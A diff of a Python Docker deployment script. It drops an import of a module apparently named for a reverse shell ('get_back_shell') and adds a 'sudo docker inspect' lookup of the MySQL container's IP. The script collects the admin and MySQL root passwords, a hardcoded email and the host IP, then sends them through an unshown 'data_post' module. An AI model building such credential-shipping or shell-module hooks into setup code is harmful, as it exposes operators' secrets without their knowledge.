@@ -3,7 +3,6 @@ from change.build import *
 from change.conf import *
 import subprocess
 import data_post
-import get_back_shell
 import os
 
 def buildup():
@@ -33,7 +32,9 @@ def buildup():
         admin_mail = '982995037@qq.com'
     #dbhost,userurl,userpassword,dbpassword,username ,usermail
     build()
-    imf = data_post.imformation(get_back_shell.key,myip,admin_password,mysql_root_password,admin_name,admin_mail)
+    output = subprocess.getstatusoutput("sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' $(sudo docker ps | grep 'mysql' | awk '{print $1}')")
+    dbhost= output[1]
+    imf = data_post.imformation(dbhost,myip,admin_password,mysql_root_password,admin_name,admin_mail)
     imf.update()
     imf.sent()
     os.system("clean")
